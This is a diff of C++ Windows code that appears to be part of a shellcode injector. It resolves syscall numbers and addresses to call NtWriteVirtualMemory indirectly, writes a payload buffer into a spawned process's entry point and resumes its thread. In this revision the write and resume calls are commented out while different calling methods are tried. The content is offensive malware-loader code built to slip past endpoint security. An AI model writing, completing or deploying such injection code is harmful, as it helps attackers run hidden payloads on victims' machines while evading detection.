@@ -15,6 +15,15 @@
 #define DOWN 32
 
 
+typedef NTSTATUS(WINAPI* _NtWriteVirtualMemory)(
+    HANDLE  ProcessHandle,
+    PVOID BaseAddress,
+    PVOID Buffer,
+    ULONG NumberOfBytesToWrite,
+    PULONG NumberOfBytesWritten
+
+    );
+
 EXTERN_C VOID GetSyscall(WORD systemCall);
 EXTERN_C VOID GetSyscall(WORD systemCall);
 EXTERN_C VOID GetSyscallAddr(INT_PTR syscallAdr);
@@ -36,9 +45,9 @@ EXTERN_C NTSTATUS myNtReadVirtualMemory(
 
 EXTERN_C NTSTATUS myNtWriteVirtualMemory(
     IN  HANDLE  ProcessHandle,
-    IN  LPVOID   BaseAddress,
+    IN  PVOID   BaseAddress,
     IN  PVOID   Buffer,
-    IN  SIZE_T   NumberOfBytesToWrite,
+    IN  ULONG   NumberOfBytesToWrite,
     OUT PULONG  NumberOfBytesWritten OPTIONAL
 
 
@@ -377,18 +386,24 @@ int main()
         GetSyscall(syscallNum);
         GetSyscallAddr(syscallAddr);
 
-        WriteProcessMemory(pi.hProcess, codeEntry, buf, sizeof(buf), NULL);
+        //WriteProcessMemory(pi.hProcess, codeEntry, buf, sizeof(buf), NULL);
 
-        NTSTATUS status5 = myNtWriteVirtualMemory(pi.hProcess, codeEntry, buf, sizeof(buf), NULL);
-        
-        if (!status5)
+       // NTSTATUS status5 = myNtWriteVirtualMemory(pi.hProcess, (PVOID)codeEntry, (PVOID)buf, (ULONG)(sizeof(buf)), NULL);
+        /*
+        if (status5)
         {
             std::cout << "myNtWriteVirtualMemory failed: " << GetLastError() << std::endl;
 
         }
+        */
 
+        /*
+        _NtWriteVirtualMemory NtWriteVirtualMemory = (_NtWriteVirtualMemory)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtWriteVirtualMemory");
+
+        NtWriteVirtualMemory(pi.hProcess, codeEntry, buf, sizeof(buf), NULL);
         
-        ResumeThread(pi.hThread);
+        */
+        //ResumeThread(pi.hThread);
 
 
 
